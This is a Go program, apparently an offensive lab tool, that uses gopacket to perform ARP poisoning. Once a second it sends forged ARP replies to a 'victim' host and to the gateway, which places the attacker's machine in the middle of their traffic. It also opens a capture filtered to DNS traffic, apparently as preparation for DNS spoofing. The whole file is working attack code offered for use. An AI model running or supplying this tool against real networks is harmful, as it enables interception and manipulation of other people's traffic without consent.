package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	err     error
	handle  *pcap.Handle
	ipAddr  net.IP
	macAddr net.HardwareAddr
	target  string
)

func main() {
	wg := sync.WaitGroup{}

	wg.Add(1)
	targetPtr := flag.String("targ", "172.18.0.3", "The ip of victim")
	targetMAC := flag.String("targm", "FF:FF:FF:FF:FF:FF", "The mac of victim.")
	gatewayPtr := flag.String("gw", "172.18.0.1", "ip of gateway")
	interfacePtr := flag.String("iface", "eth0", "if name of attacker")
	gatewayMAC := flag.String("gwm", "FF:FF:FF:FF:FF:FF", "mac of gateway")
	if targetPtr == nil || targetMAC == nil || gatewayPtr == nil || gatewayMAC == nil {
		fmt.Errorf("wrong input\n")
		os.Exit(1)
	}

	flag.Parse()

	handle, err = pcap.OpenLive(*interfacePtr, 1600, false, pcap.BlockForever)
	handle.SetBPFFilter("dst port 53")
	fmt.Printf("target mac:\t%s\n", *targetMAC)
	fmt.Printf("gateway ip:\t%s\n", *targetPtr)
	fmt.Printf("gateway mac:\t%s\n", *gatewayMAC)
	fmt.Printf("gateway ip:\t%s\n", *gatewayPtr)
	fmt.Printf("interface :\t%s", *interfacePtr)

	netInterface, _ := net.InterfaceByName(*interfacePtr)
	macAddr = netInterface.HardwareAddr
	addrs, _ := netInterface.Addrs()
	ipAddr, _, err = net.ParseCIDR(addrs[0].String())
	target = *targetPtr

	go arpPoison(*targetMAC, *gatewayPtr, *gatewayMAC)
	defer handle.Close()
	wg.Wait()
}

func arpPoison(targetMAC, gateway, gatewayMAC string) {
	gw := (net.ParseIP(gateway))[12:]
	tg := (net.ParseIP(target))[12:]
	tgm, _ := net.ParseMAC(targetMAC)
	gwm, _ := net.ParseMAC(gatewayMAC)

	ethernetPacket := layers.Ethernet{}
	ethernetPacket.DstMAC = tgm
	ethernetPacket.SrcMAC = macAddr
	ethernetPacket.EthernetType = layers.EthernetTypeARP

	arpPacket := layers.ARP{}
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.Protocol = 0x0800
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2

	arpPacket.SourceHwAddress = macAddr
	arpPacket.SourceProtAddress = gw
	arpPacket.DstHwAddress = tgm
	arpPacket.DstProtAddress = tg

	gwEthernetPacket := ethernetPacket
	gwARPPacket := arpPacket

	gwARPPacket.SourceProtAddress = tg
	gwARPPacket.DstHwAddress = gwm
	gwARPPacket.DstProtAddress = gw
	ticker := time.NewTicker(time.Second)

	for range ticker.C {
		writePoison(arpPacket, ethernetPacket)
		writePoison(gwARPPacket, gwEthernetPacket)
	}
}

func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buf, opts, &etherPacket, &arpPacket)
	packetData := buf.Bytes()
	handle.WritePacketData(packetData[:42])
}
